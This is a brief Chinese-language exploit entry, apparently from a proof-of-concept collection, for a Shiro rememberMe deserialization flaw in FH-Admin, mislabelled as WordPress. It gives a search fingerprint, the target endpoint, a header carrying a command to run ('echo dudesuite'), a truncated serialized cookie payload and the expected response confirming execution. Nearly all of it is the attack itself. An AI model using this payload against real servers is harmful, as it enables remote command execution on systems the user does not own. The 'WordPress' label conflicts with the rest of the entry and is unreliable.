# WordpressFHAdminregisterSysUser.doshiro反序列化漏洞

- **系统**：WordPress　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="FH-Admin"`
- **请求**：`GET /appSysUser/registerSysUser.do HTTP/1.1`
- **关键头**：`X-Token-Data: echo dudesuite`　`Cookie: rememberMe=RjI4NWNFQzBDZTVGNWNBM6ByNoG5jvpzbQqTkz2zP8GLkE05HSQI3cfp4VAgaPDcrRrjk…`
- **预期**：200　|　dudesuite